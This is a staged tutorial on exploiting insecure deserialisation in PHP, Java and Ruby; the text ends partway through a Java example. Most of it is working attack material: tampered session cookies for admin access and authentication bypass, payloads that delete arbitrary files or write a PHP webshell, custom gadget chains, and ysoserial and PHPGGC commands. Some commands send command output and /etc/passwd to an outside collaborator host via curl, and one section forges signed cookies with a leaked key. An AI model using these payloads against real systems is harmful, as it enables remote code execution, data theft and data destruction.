# Exploiting Insecure Deserialization Vulnerabilities

Exploiting insecure deserialization is significantly more accessible than most developers and security practitioners assume — the exploitation workflow follows a clear progression from identification to modification to injection to gadget chain execution, and pre-built tooling like ysoserial and PHPGGC means that even black-box exploitation of complex gadget chains requires only identifying what library is present on the server, not constructing the chain from scratch. The key conceptual shift that makes understanding these attacks intuitive is recognising that a gadget chain is not injected code — it is entirely pre-existing legitimate code in the application's dependencies, and an attacker controls only the serialised data that flows through it; the chain itself consists of methods that developers wrote for entirely benign purposes, weaponised solely by controlling what object attributes those methods operate on when a magic method fires at deserialisation time. This document walks through the complete exploitation journey from initial identification of serialised data in application traffic through to constructing custom gadget chains, PHAR-based implicit deserialisation, and memory corruption exploitation — covering PHP, Java, and Ruby with concrete examples at every stage. 

## Stage 1: Identifying Serialised Data

### Recognising serialisation formats in application traffic

**PHP serialisation — human-readable text format:** 

```
PHP serialised format reference:

Type tokens:
O:n:"ClassName":count:{...}  — Object (n=class name length, count=num properties)
a:n:{...}                    — Array (n=element count)
s:n:"value"                  — String (n=byte length)
i:n                          — Integer
b:0 / b:1                    — Boolean false / true
d:n                          — Float/Double
N                            — NULL
r:n                          — Reference to property index n
C:n:"ClassName":n:{data}     — Custom serialised class (implements Serializable)

Example — User object with two attributes:
$user->name = "carlos";
$user->isLoggedIn = true;

Serialised form:
O:4:"User":2:{s:4:"name";s:6:"carlos";s:10:"isLoggedIn";b:1;}

Reading it token by token:
O:4:"User"      → Object whose class name is 4 chars: "User"
:2:             → Object has 2 properties
{               → Open property list
s:4:"name"      → Property key: 4-char string "name"
;               → Separator
s:6:"carlos"    → Property value: 6-char string "carlos"
;               → Separator
s:10:"isLoggedIn" → Property key: 10-char string "isLoggedIn"
;               → Separator
b:1             → Property value: boolean true
}               → Close property list

Nested object example:
O:7:"Session":2:{
    s:4:"user";
    O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
    s:7:"expires";i:1708300800;
}
→ Session object containing a nested User object
```

**PHP serialised data in HTTP traffic — where to look:**

```
Common locations for PHP serialised objects:
1. Cookies (Base64-encoded):
   Cookie: session=TzozOiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czo3OiJpc0FkbWluIjtiOjA7fQ==
   Base64 decode → O:4:"User":3:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}

2. POST body parameters:
   POST /login HTTP/1.1
   data=Tzo0OiJVc2VyIjoyO...

3. Hidden form fields:
   <input type="hidden" name="object" value="O%3A4%3A%22User%22...">
   (URL-encoded PHP serialised data)

4. JSON fields containing serialised sub-objects:
   {"token":"TzozOiJVc2VyIj...", "sig":"abc123"}
   The "token" field is Base64-encoded PHP serialisation

5. Custom HTTP headers:
   X-Session-Data: TzozOiJVc2VyIj...

Detection workflow in Burp Suite:
→ Proxy → HTTP history → examine all cookies and parameters
→ Right-click value → Decode selection → Base64 → check for O: prefix
→ Or: use Burp's built-in Inspector which auto-detects and decodes
→ Search across all requests: Ctrl+F → "O:" or "unserialize"
```

**Java serialisation — binary format identification:** 

```
Java serialised objects always begin with the same magic bytes:
Hex:    AC ED 00 05
ASCII:  ìí (non-printable)

After Base64 encoding, Java serialised objects ALWAYS start with:
rO0AB...

This is how to immediately identify Java serialised data in any field:
→ Cookie: rO0ABXNyAA...  ← Java serialised object!
→ POST body containing rO0A...  ← Java serialised object!
→ Response body with rO0A...  ← Java serialised object being returned!

Complete Java serialisation stream structure:
AC ED          — Magic header (STREAM_MAGIC)
00 05          — Stream version (STREAM_VERSION)
73             — TC_OBJECT (serialised object follows)
72             — TC_CLASSDESC (class description follows)
00 [len] [classname bytes]  — Class name
[8 bytes]      — SerialVersionUID (class version fingerprint)
...            — Field descriptors and values

Identifying in Burp:
→ Proxy → HTTP history → any parameter
→ Decode Base64 value
→ Check hex: does it start with AC ED 00 05?
→ If yes: Java serialised object

Burp extension "Java Deserialization Scanner":
→ Install from BApp Store
→ Automatically identifies and tests Java serialised objects
→ Tries known gadget chains from ysoserial
→ Reports: "Possible gadget chain: CommonsCollections1"
```

**Other language formats — quick fingerprinting:**

```
Python pickle:
Binary:  \x80\x02 (protocol 2), \x80\x03 (protocol 3), \x80\x04 (protocol 4)
In Base64: gASV (protocol 4), gAN (protocol 3), gAJ (protocol 2)
Also: "R" opcode in raw pickle stream = __reduce__ call = arbitrary code!

Ruby Marshal:
Binary:  \x04\x08
In Base64: BAh
Marshal.dump output always starts with these two bytes

.NET BinaryFormatter:
Binary:  00 01 00 00 00 FF FF FF FF
In Base64: AAEAAAD

.NET JSON.NET (Newtonsoft):
"$type":"Namespace.ClassName, Assembly"  — class name in JSON!
{"$type":"System.Windows.Data.ObjectDataProvider,...","MethodName":"Start",...}
Look for $type fields in JSON — type confusion attack vector!

Detecting via Burp across all formats:
→ Install "Hackvertor" extension for encoding/decoding manipulation
→ All decoded values should be examined for magic bytes and patterns
→ Binary formats: check hex view, not text view
→ Content-Type: application/octet-stream → likely binary serialised object
```

## Stage 2: Manipulating Serialised Objects

### Direct object attribute modification

**Step-by-step PHP object modification:** 

```
Target cookie (found in HTTP request):
Cookie: session=TzozOiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czo3OiJpc0FkbWluIjtiOjA7fQ==

Step 1: Base64 decode
TzozOiJVc2VyIjo... → O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}

Step 2: Parse the structure
O:4:"User":2:{
    s:8:"username"; s:6:"carlos";
    s:7:"isAdmin";  b:0;           ← Target: change b:0 to b:1
}

Step 3: Modify the target field
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
                                                                  ↑ 0 changed to 1

Step 4: Re-encode to Base64
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
→ TzozOiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czo3OiJpc0FkbWluIjtiOjE7fQ==

Step 5: Replace in HTTP request
Cookie: session=TzozOiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czo3OiJpc0FkbWluIjtiOjE7fQ==

Step 6: Forward request → admin panel accessible!

Quick Burp workflow:
Proxy → Intercept → right-click cookie → Send to Decoder
Decoder tab: Base64 decode → edit b:0 to b:1 → Base64 encode
Copy back to Intercept tab → Forward
```

**Critical rule — byte length consistency:**

```
ALWAYS update length indicators when modifying string values!

Example: changing username from "carlos" to "administrator"

WRONG (will corrupt deserialisation):
s:8:"username";s:6:"administrator";
               ↑ says 6 bytes, but "administrator" is 13 bytes!
→ unserialize() fails, may throw error or return false

CORRECT:
s:8:"username";s:13:"administrator";
               ↑ updated to 13 bytes

Step-by-step:
1. Count new string length: strlen("administrator") = 13
2. Update the length token: s:6: → s:13:
3. Verify the full object syntax is still valid
4. Re-encode

For multi-byte UTF-8 characters:
"café" = 5 chars but 6 bytes (é is 2 bytes in UTF-8)
PHP's s: token counts BYTES not characters!
Use strlen() or Python's len(value.encode('utf-8')) to count bytes

Automated byte length fixing in Burp:
The "Hackvertor" BApp extension handles this automatically:
→ Modify the string value
→ Hackvertor automatically recalculates and updates the length prefix
→ Particularly useful for binary formats where manual byte counting is error-prone
```

### Modifying data types — PHP type juggling exploitation

**Exploiting loose comparison with type manipulation:** 

```
PHP loose comparison (==) table — exploit-relevant behaviours:
┌────────────────────────────┬────────────────────────────────────────────┐
│ Comparison                 │ Result                                     │
├────────────────────────────┼────────────────────────────────────────────┤
│ 0 == "Example string"      │ TRUE  (PHP 7.x only — string → 0)         │
│ 0 == "carlos"              │ TRUE  (PHP 7.x only)                       │
│ 0 == "admin password"      │ TRUE  (PHP 7.x only)                       │
│ 5 == "5 of something"      │ TRUE  (both PHP 7 and 8! starts with int)  │
│ 5 == "5"                   │ TRUE  (both PHP 7 and 8)                   │
│ 100 == "100abc"             │ TRUE  (both PHP 7 and 8)                   │
│ 0 == "Example string"      │ FALSE (PHP 8.0+ — strings no longer → 0)  │
│ "1" == "01"                │ TRUE  (numeric string comparison)          │
│ "10" == "1e1"              │ TRUE  (scientific notation!)               │
│ true == "any string"       │ TRUE  (any non-empty string)               │
└────────────────────────────┴────────────────────────────────────────────┘

Vulnerable code pattern:
$login = unserialize($_COOKIE['session']);
if ($login['password'] == $password) {    // LOOSE comparison!
    // Authenticated!
}

The vulnerability chain:
1. Application deserialises cookie to get $login array
2. $login['password'] contains the value from the serialised data
3. Compared with actual stored password using == (not ===)
4. If attacker changes password field to integer 0...
5. PHP 7.x: 0 == "any_password_string_not_starting_with_digit" → TRUE!
6. Authentication bypassed!

Attack in PHP 7.x:
Original cookie (decoded): a:2:{s:8:"username";s:6:"carlos";s:8:"password";s:6:"secret";}
Modified cookie:            a:2:{s:8:"username";s:6:"carlos";s:8:"password";i:0;}
                                                                             ↑ integer 0!

Key: must change both the type token (s: → i:) AND remove the string value format
s:6:"secret"  →  i:0

After Base64 re-encoding: submit as cookie
Result: 0 == "secret" → TRUE → authenticated as carlos without knowing password!

Note on PHP 8:
→ 0 == "non-numeric-string" now evaluates to FALSE in PHP 8+
→ 5 == "5abc" still evaluates to TRUE (starts with number)
→ Confirm PHP version via response headers (X-Powered-By: PHP/7.x) or error messages
→ Type juggling may still apply for strings starting with digits
```

**Data type attack scenarios:**

```
Scenario 1: Array vs. string comparison
$storedHash = "e10adc3949ba59abbe56e057f20f883e";  // md5("123456")
$providedHash = unserialize($_COOKIE['hash']);
if ($providedHash == $storedHash) { /* authenticated */ }

Attack: Make $providedHash TRUE (boolean)
Cookie contains: b:1 (boolean true)
Comparison: TRUE == "e10adc..." → TRUE!
→ PHP coerces "e10adc..." to boolean TRUE for comparison
→ Authentication bypassed!

Scenario 2: NULL coercion
if ($session->accessLevel == 1) { grantUserAccess(); }
if ($session->accessLevel == 100) { grantAdminAccess(); }

Modify accessLevel to NULL: N; (PHP null)
NULL == 1 → FALSE
NULL == 100 → FALSE
...but potentially causes exceptions revealing stack traces with info disclosure

Scenario 3: Float comparison
if ($discount == 0.1) { applyDiscount(); }
Change 0.1 to 0 in serialised data
0 == 0.1 → FALSE (this particular case safe)
But: if using string representation: "0.10" vs "0.1" comparison issues possible
```

## Stage 3: Using Application Functionality

### Weaponising legitimate operations with malicious data

**File deletion via deserialistion:** 

```
Application source code (Delete Account feature):
<?php
class User {
    public $username;
    public $email;
    public $image_location;   // Path to profile image file
}

// Delete user account handler:
function deleteUserAccount($cookie) {
    $user = unserialize($cookie);
    if (isset($user->image_location)) {
        // Delete the profile picture when deleting account
        unlink($user->image_location);   // DANGEROUS SINK
    }
    // ... delete from database etc.
}
```

```
Normal serialised cookie for user "carlos":
O:4:"User":3:{
    s:8:"username";s:6:"carlos";
    s:5:"email";s:20:"carlos@example.com";
    s:14:"image_location";s:32:"/home/carlos/uploads/avatar.jpg";
}

Attack — modify image_location to target arbitrary file:
O:4:"User":3:{
    s:8:"username";s:6:"carlos";
    s:5:"email";s:20:"carlos@example.com";
    s:14:"image_location";s:23:"/home/carlos/morale.txt";
}
                              ↑↑ Updated length: 23 bytes for "/home/carlos/morale.txt"

Attack chain:
1. Replace cookie with modified serialised object
2. Trigger "Delete My Account" functionality in the application
3. Server deserialises cookie → User object with attacker's image_location
4. unlink("/home/carlos/morale.txt") executes
5. File deleted — arbitrary file deletion as web server user!

Extending the attack surface:
→ /etc/cron.d/database-backup   → delete scheduled backup
→ /var/www/html/maintenance.php  → delete security patches
→ Application config files       → break application (DoS)
→ SSH authorized_keys            → remove admin access
→ Any file readable by web server process!

Chaining file deletion with directory traversal:
image_location: s:27:"/../../../etc/cron.daily/job"
→ Adjust length for traversal path
→ Delete files outside web root if server follows symlinks
```

## Stage 4: Magic Methods — Entry Points for Advanced Attacks

### Comprehensive PHP magic method catalogue for exploitation

**Magic methods that fire during/after deserialisation:** 

```
__wakeup() — Primary deserialisation entry point
Fires: Immediately when unserialize() is called on an object of this class
Use: Perform re-initialisation after deserialisation
Attack use: Executes attacker-controlled code during deserialisation itself

Example vulnerable __wakeup():
class DatabaseConnector {
    public $host;
    public $query;

    public function __wakeup() {
        // "Restore" DB connection on deserialise
        $this->db = new PDO("mysql:host=" . $this->host);
        $this->db->exec($this->query);     // Execute attacker's SQL!
    }
}

Inject: O:17:"DatabaseConnector":2:{
    s:4:"host";s:9:"localhost";
    s:5:"query";s:29:"DROP TABLE users; -- injected";
}
→ __wakeup() fires, executes attacker's SQL query!
```

```
__destruct() — Fires at end of script (or when object leaves scope)
Fires: When PHP garbage-collects the object (script end, or explicit unset())
Attack use: Delayed execution — fires even if application rejects object early!

Example vulnerable __destruct():
class TempFileManager {
    public $tempFile;

    public function __destruct() {
        // "Cleanup" — delete the temp file
        if (file_exists($this->tempFile)) {
            unlink($this->tempFile);        // DANGEROUS SINK
        }
    }
}

Attack: Even if unserialize() causes an exception (object rejected!),
        __destruct() STILL fires on the partially-constructed object!
Inject: O:15:"TempFileManager":1:{s:8:"tempFile";s:21:"/home/carlos/.ssh/id_rsa";}
→ Application throws exception (wrong class type)
→ Attacker thinks attack failed
→ But: __destruct() fires on cleanup → unlink() called → file deleted!
→ Attack succeeded silently despite apparent failure!

--fast-destruct flag in PHPGGC:
phpggc -f Framework/Chain exec 'command'
# -f triggers fast destruct: wraps in array so __destruct fires during
# unserialize itself rather than waiting for script end
# More reliable timing for exploitation
```

```
__toString() — Fires when object used in string context
Fires: When object is concatenated with string, echo'd, or used as string
Attack use: Triggered by downstream code that treats objects as strings

Example:
class FileReader {
    public $filePath;

    public function __toString() {
        return file_get_contents($this->filePath);  // Reads any file!
    }
}

// Downstream code (not the unserialize caller):
echo "Welcome " . $deserializedObject;   // Triggers __toString!
→ file_get_contents("/etc/passwd") → file contents dumped to response!
```

```
__get() — Fires when accessing undefined/inaccessible property
__set() — Fires when setting undefined/inaccessible property
__call() — Fires when calling undefined method
__invoke() — Fires when object is called as a function

These are important for GADGET CHAINS — they enable method invocations
to "jump" to unexpected code paths via property access patterns.
```

**Java magic methods for deserialisation:**

```java
// readObject() — the primary Java deserialisation entry point
// Any class implementing Serializable CAN define this method
// When defined, it replaces the default deserialisation behaviour

public class VulnerableSession implements Serializable {
    public String username;
    public boolean isAdmin;

    private void readObject(ObjectInputStream in)
            throws IOException, ClassNotFoundException {
        // This executes AUTOMATICALLY when this class is deserialised!
        in.defaultReadObject();   // Standard deserialisation first

        // Dangerous code here executes on deserialisation:
        if (this.isAdmin) {
            // Re-establish admin privileges from serialised state!
            grantAdminAccess(this.username);
        }
    }
}

// Attack: Attacker serialises VulnerableSession with isAdmin = true
// Submits as cookie
// Server calls ObjectInputStream.readObject()
// readObject() in VulnerableSession fires
// isAdmin = true (from attacker's data)
// grantAdminAccess() called with attacker's username!

// Other Java magic methods (used in gadget chains):
// readResolve():  Called AFTER readObject() — can substitute different object
// readExternal(): Externalizable interface version of readObject()
// finalize():     Called by GC (deprecated, but historically used in chains)
// equals():       Called when object used as HashMap key
// hashCode():     Called when object placed in HashSet/HashMap
// compareTo():    Called when object placed in TreeMap/TreeSet
// toString():     Called in string contexts (logging, concatenation)
```

**Ruby magic methods:** 

```ruby
# marshal_load — fires during Marshal.load()
class MaliciousObject
    def marshal_load(args)
        # Called automatically when this object is deserialised!
        system(args['cmd'])   # Execute arbitrary command!
    end
end

# Gem::Requirement — historical RCE gadget entry point
# marshal_load implemented in Gem::Requirement calls sort!
# sort! triggers comparisons → leads to Gem::Version
# which eventually reaches system() calls

# Other Ruby magic methods relevant to deserialisation chains:
# initialize:          Called when object created (not during Marshal directly)
# initialize_copy:     Called on dup/clone operations in chains
# respond_to_missing?: Called when method check performed
# method_missing:      Called when undefined method called — chain bridging!
```

## Stage 5: Injecting Arbitrary Object Types

### Moving beyond modifying expected objects

**Why class substitution amplifies the attack surface:** 

```
Normal flow:
Application expects: unserialize(cookie) → User object
Application uses: $user->isAdmin, $user->email, etc.
Attack surface: only User class attributes

With arbitrary object injection:
Application deserialises: ANY serialisable class in the codebase!
Application ALSO instantiates all nested objects!
Attack surface: EVERY class + ALL their magic methods + ALL dependencies

The key insight:
PHP's unserialize() has no type checking!
"I expected a User but got a DatabaseConnector"
→ unserialize() doesn't care
→ DatabaseConnector is instantiated
→ DatabaseConnector's __wakeup() fires
→ Attack executes

Even if the application catches the wrong-type exception:
→ The object was ALREADY INSTANTIATED
→ Magic methods like __wakeup() ALREADY FIRED
→ The attack MAY have already completed before the exception!
```

**Finding injectable classes — white-box approach:**

```php
// Source code analysis — what to look for:

// 1. Search all PHP files for magic methods:
grep -r "__wakeup\|__destruct\|__toString\|__sleep\|__get\|__set\|__call" \
     /var/www/html/ --include="*.php"

// 2. For each class found, analyse the magic method code:

// Dangerous pattern: magic method uses object properties in dangerous ways
class LogManager {
    public $logFile;        // ← Attacker can set this!
    public $logData;        // ← Attacker can set this!

    public function __destruct() {
        file_put_contents($this->logFile, $this->logData);  // FILE WRITE!
    }
}
// Attacker controls: logFile = "/var/www/html/shell.php"
//                    logData = "<?php system($_GET['cmd']); ?>"
// __destruct fires → webshell written!

// 3. Check ALL included libraries, not just application code:
// composer.json → look up each package for known magic methods
// vendor/ directory → grep all files for magic methods
// PHP frameworks (Laravel, Symfony, Yii, etc.) have extensively documented
// gadget chains — many already in PHPGGC!
```

**Crafting the injection payload:**

```php
// Step 1: Identify target class with dangerous magic method
// (Found via source code or framework knowledge)
class CustomLogger {
    public $logPath = '/var/log/app.log';
    public $message = 'default message';

    public function __destruct() {
        file_put_contents($this->logPath, $this->message . "\n", FILE_APPEND);
    }
}

// Step 2: Create exploit script to generate serialised payload:
<?php
// Replicate the class definition (must match exactly!)
class CustomLogger {
    public $logPath;
    public $message;
}

// Instantiate with attacker-controlled values:
$exploit = new CustomLogger();
$exploit->logPath = '/var/www/html/shell.php';
$exploit->message = '<?php system($_GET["cmd"]); ?>';

// Serialise:
$payload = serialize($exploit);
echo base64_encode($payload);
// Output: TzoxMjoiQ3VzdG9tTG9nZ2VyIjoyOntzOjc6Im...

// Step 3: Submit as application cookie:
// Cookie: session=[base64-encoded payload]

// Step 4: Application code:
$session = unserialize($_COOKIE['session']);  // CustomLogger instantiated!
// Application code throws: "Expected User, got CustomLogger" → exception
// BUT: __destruct() fires on exception cleanup!
// file_put_contents('/var/www/html/shell.php', '<?php system(...) ?>')
// WEBSHELL WRITTEN → RCE ACHIEVED!
```

## Stage 6: Pre-Built Gadget Chains

### Using ysoserial for Java exploitation

**ysoserial — the definitive Java gadget chain toolkit:** 

```
ysoserial available gadget chains (select list):
Chain Name            Library                     Effect
─────────────────────────────────────────────────────────────
BeanShell1            BeanShell                   RCE
C3P0                  C3P0 Connection Pool        SSRF / RCE
Click1                Apache Click                RCE
Clojure               Clojure                     RCE
CommonsBeanutils1     Apache Commons BeanUtils    RCE
CommonsCollections1   Apache Commons Collections 3.1  RCE
CommonsCollections2   Apache Commons Collections 4.0  RCE
CommonsCollections3   Apache Commons Collections 3.1  RCE
CommonsCollections4   Apache Commons Collections 4.0  RCE
CommonsCollections5   Apache Commons Collections  RCE
CommonsCollections6   Apache Commons Collections  RCE (no-JDK-version-restriction)
CommonsCollections7   Apache Commons Collections  RCE
Groovy1               Apache Groovy               RCE
Hibernate1            Hibernate                   RCE
Hibernate2            Hibernate                   RCE
JBossInterceptors1    JBoss Interceptors API      RCE
JRMPClient            Java RMI                    TCP connection (detection)
JRMPListener          Java RMI                    RCE via RMI gadget
JSON1                 json-lib                    RCE
JavassistWeld1        Javassist + Weld            RCE
Jdk7u21               JDK 7u21 (no extra dep!)    RCE
MozillaRhino1         Mozilla Rhino               RCE
Myfaces1              Apache MyFaces              RCE
ROME                  ROME RSS                    RCE
Spring1               Spring Framework            RCE
Spring2               Spring Framework            RCE
URLDNS                (no extra dependency)        DNS lookup (detection only)
Wicket1               Apache Wicket               RCE
```

**Systematic black-box exploitation workflow:**

```
Phase 1: Confirm Java deserialisation (safe — DNS only)

Identify the serialised field (starts with rO0A in Base64)
Generate URLDNS detection payload:

java -jar ysoserial-all.jar URLDNS 'http://UNIQUE_ID.burpcollaborator.net' | base64 | tr -d '\n'

Submit in place of the serialised cookie/parameter
Check Burp Collaborator for DNS interaction

✓ DNS received → Java deserialisation CONFIRMED
✗ No DNS → not Java deserialisation, or DNS outbound blocked

If DNS blocked: use JRMPClient for TCP-based detection
java -jar ysoserial-all.jar JRMPClient '192.168.1.100' | base64 | tr -d '\n'
Compare response time for:
→ Internal IP (LAN): immediate response
→ External IP (firewalled): delayed response (TCP timeout)
→ Delay indicates server tried to connect → deserialisation confirmed!
```

```
Phase 2: Identify available library chains (safe DNS per chain)

Generate one detection payload per library, each with unique Collaborator subdomain:
CC1.YOURCOLLAB.burpcollaborator.net
CC2.YOURCOLLAB.burpcollaborator.net
Spring1.YOURCOLLAB.burpcollaborator.net
Hibernate1.YOURCOLLAB.burpcollaborator.net

for chain in CommonsCollections1 CommonsCollections2 CommonsCollections6 Spring1 Spring2 Hibernate1 Jdk7u21; do
    java -jar ysoserial-all.jar $chain \
      "nslookup ${chain}.YOURCOLLAB.net" \
      | base64 | tr -d '\n' > ${chain}_detect.txt
done

Submit each, check which subdomain triggers DNS:
→ CommonsCollections6.YOURCOLLAB.net triggered → CC6 chain available!
→ Spring1.YOURCOLLAB.net triggered → Spring chain available!

Note: Multiple chains may succeed (multiple libraries present)
Use any confirmed chain for subsequent exploitation
```

```
Phase 3: Execute command (escalate from detection to exploitation)

Chain confirmed: CommonsCollections6 (example)

Out-of-band confirmation with command output:
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLABORATOR.net/$(whoami)' | base64 | tr -d '\n'

Collaborator receives: GET /www-data HTTP/1.1
→ Confirms command execution as user www-data!

File read via out-of-band:
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl -d @/etc/passwd http://COLLABORATOR.net/data' | base64 | tr -d '\n'
→ Collaborator receives POST with /etc/passwd contents!

Java version 16+ requirements:
Must add JVM flags when running ysoserial on Java 16+:
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 'curl http://COLLABORATOR.net/'
```

### Using PHPGGC for PHP exploitation

**PHPGGC — PHP Generic Gadget Chains:** 

```
PHPGGC usage:
./phpggc [Framework/Chain] [Function] [Argument]
./phpggc --list             # List all available chains

Available framework chains (major selections):
Framework          Chain         Effect
─────────────────────────────────────────────
Laravel            RCE1          RCE via system()
Laravel            RCE2          RCE via exec()
Laravel            RCE3          RCE via passthru()
Laravel            FileWrite1    Write file
Symfony            RCE1          RCE
Symfony            RCE2          RCE (alternative)
Symfony            RCE3          RCE
Symfony            RCE4          RCE (exec)
Symfony            FileWrite1    Write file
Zend               RCE1          RCE
Yii                RCE1          RCE
Magento            RCE1          RCE
WordPress          RCE1          RCE
Drupal             RCE1          RCE
Slim               RCE1          RCE
Phalcon            RCE1          RCE
Guzzle             FW1           File Write
Monolog            RCE1          RCE
SwiftMailer        FW1           File Write
```

```
Identifying target PHP framework (black-box):
→ Cookie names: laravel_session, PHPSESSID + X-Generator header
→ Error page format (Laravel's debug page, Symfony's profiler)
→ phpinfo() disclosure (sometimes at /phpinfo.php or similar)
→ Response headers: X-Powered-By: PHP, X-Generator: Symfony
→ Common URL patterns: /app_dev.php (Symfony dev), /public/index.php (Laravel)
→ JavaScript file paths revealing framework structure
→ Robots.txt exposing framework-specific directories

Step 1: Identify framework → Laravel (from session cookie name)

Step 2: Generate payload:
./phpggc -b Laravel/RCE1 system 'id'
# -b = Base64 encode output
# system = PHP function to call
# 'id' = argument (command to run)

Output: TzozNToiSWxsdW1pbmF0ZVxCcm9hZGNhc3...

Step 3: Submit as cookie value
Step 4: Observe response for command output
(If system() returns output and it appears in response → RCE with output!)
(If blind → use curl to exfiltrate to Collaborator)
```

**Exploiting signed serialised cookies with PHPGGC:** 

```
Some PHP applications sign their serialised cookies to prevent tampering:
Cookie: {"token":"TzozOiJVc2VyIjo...","sig_hmac_sha1":"abc123def456"}

The signature appears to block modification — but:
If the SECRET_KEY is discoverable, the signature can be forged!

Finding the secret key:
→ phpinfo() exposure: GET /phpinfo.php → reveals all PHP configuration
→ Look for: SECRET_KEY, APP_KEY, or custom env variables
→ Debug mode (Symfony Profiler, Laravel Telescope) may expose environment
→ Source code in backup files: .git/config, /.env, /config.php.bak
→ Error messages revealing config variable names

Once secret key found:
SECRET_KEY = "s3cr3t_k3y_fr0m_phpinfo"

Step 1: Generate PHPGGC payload (Base64):
./phpggc -b Symfony/RCE4 exec 'rm /home/carlos/morale.txt'
Output: TzozNToiU3ltZm9ueVxDb21wb25lbnQ...

Step 2: Sign the payload with discovered secret key:
<?php
$object = "PHPGGC_OUTPUT_FROM_STEP_1";
$secretKey = "s3cr3t_k3y_fr0m_phpinfo";
$cookie = urlencode(
    '{"token":"' . $object . '","sig_hmac_sha1":"' .
    hash_hmac('sha1', $object, $secretKey) .
    '"}'
);
echo $cookie;
?>

Step 3: Submit the signed cookie containing the gadget chain payload
→ Signature validates (correct HMAC)
→ Application deserialises the payload
→ Gadget chain fires → command executes!

Why this works:
Signing PREVENTS random tampering
Signing does NOT prevent malicious payloads if the key is leaked!
The signature only proves "this was signed with the known key"
Not "this contains a safe object"
```

**Working with documented gadget chains:** 

```
When no PHPGGC/ysoserial chain exists for target framework:
Search for documented exploits online:
→ CVE databases: search "[Framework] [Version] deserialization"
→ Security research blogs, HackerOne, Bugcrowd disclosed reports
→ ExploitDB: searchsploit "deserialization [language]"
→ GitHub: search "[Framework] gadget chain deserialization"

Ruby example — documented Gem::Requirement chain:
Published by: Elttam Security Research (2018)
Affects: Ruby 2.x Universal RCE via Marshal.load()
Chain: Gem::Requirement → Gem::DependencyList → ... → system()

If documented exploit found in different language/version:
→ Read the write-up to understand the method call chain
→ Adapt to your target's specific version
→ May require minor code modifications:
  - Class names may differ between versions
  - Method signatures may have changed
  - Intermediate gadget classes may need updating

Process for adapting documented chain:
1. Identify all classes involved in the chain
2. Find corresponding classes in target version's source
3. Verify method signatures still match
4. Adjust serialised object structure if class properties changed
5. Test with out-of-band callback before executing destructive commands
```

## Stage 7: Building Custom Gadget Chains

### Manual chain construction when off-the-shelf tools fail

**Systematic source code analysis workflow:** 

```
Step 1: Find all magic methods in the codebase
grep -rn "__wakeup\|__destruct\|__toString\|readObject\|marshal_load" \
     ./src/ ./vendor/ --include="*.php" --include="*.java"

For each file found, note:
→ Class name
→ Magic method name
→ What the magic method does
→ Which object attributes does it access?
→ Does it call any other methods?
→ Does it call any dangerous functions?

Step 2: For each magic method — assess exploitability

Directly dangerous (can be kick-off gadget AND terminal gadget):
public function __wakeup() {
    exec($this->command);    // Direct RCE! Attacker controls $this->command
}
→ No chain needed — direct exploitation!

Indirectly dangerous (kick-off gadget → need to chain):
public function __wakeup() {
    $this->logger->log($this->message);    // Calls method on another object!
    //              ↑↑ Attacker controls $this->logger
    //              Object type of $this->logger = attacker's choice!
}
→ Can set $this->logger to ANY object with a log() method!
→ Find what other classes have log() method with dangerous behaviour!
```

```
Step 3: Build the chain map

Kick-off gadget identified:
class Session {
    public $cache;           // Attacker-controlled object attribute!

    public function __wakeup() {
        $this->cache->load();  // Calls load() on $this->cache
    }
}

Search for classes with load() method:
grep -rn "function load()" ./src/ ./vendor/

Found:
class FileCache {
    public $cachePath;       // Attacker-controlled!
    public $cacheData;       // Attacker-controlled!

    public function load() {
        return include($this->cachePath);  // DANGEROUS SINK — file include!
    }
}

Chain complete:
Session (kick-off)
    → __wakeup() calls $this->cache->load()
    → $this->cache is FileCache (attacker sets this!)
    → FileCache::load() calls include($this->cachePath)
    → $this->cachePath is attacker-controlled
    → include('data://text/plain,<?php system($_GET[cmd]);?>') = RCE!

Or for file write (more reliable):
    → cachePath = '/var/www/html/shell.php'
    → But include() would execute it, not write it...
    → Need different sink: file_put_contents-based gadget, or:
    → cachePath = 'data://text/plain,<?php system($_GET[cmd]);?>'
    → PHP data:// stream wrapper → code included as PHP!
```

```
Step 4: Serialise the chain

PHP serialisation of multi-object chain:
<?php
// Replicate ONLY the class declarations (not full implementations!)
// Must match field names exactly, no need to replicate methods

class Session {
    public $cache;
}

class FileCache {
    public $cachePath;
    public $cacheData;
}

// Construct chain from inner to outer:
$fileCache = new FileCache();
$fileCache->cachePath = 'data://text/plain,<?php system($_GET["cmd"]); ?>';

$session = new Session();
$session->cache = $fileCache;   // Set FileCache as the cache object!

// Serialise:
$payload = serialize($session);
echo base64_encode($payload);
?>

Output:
O:7:"Session":1:{
    s:5:"cache";
    O:9:"FileCache":2:{
        s:9:"cachePath";s:51:"data://text/plain,<?php system($_GET["cmd"]); ?>";
        s:9:"cacheData";N;
    }
}

Submit this → Session deserialised → __wakeup() fires →
FileCache::load() called → include('data://...') → PHP code executed!
```

**Java custom gadget chain construction:** 

```java
// Source code analysis for Java custom chains:

// Step 1: Find readObject() implementations
// Grep: readObject(ObjectInputStream in)

// Found in application code:
public class ProductCatalog implements Serializable {
    private String cacheFile;

    private void readObject(ObjectInputStream in)
            throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // "Warm up" cache by loading from file
        this.cache = loadFromFile(this.cacheFile);
    }

    private Object loadFromFile(String filename) throws IOException {
        FileInputStream fis = new FileInputStream(filename);
        ObjectInputStream ois = new ObjectInputStream(fis);
        return ois.readObject();   // NESTED DESERIALISATION!
    }
}
// This is a "nested deserialisation" sink!
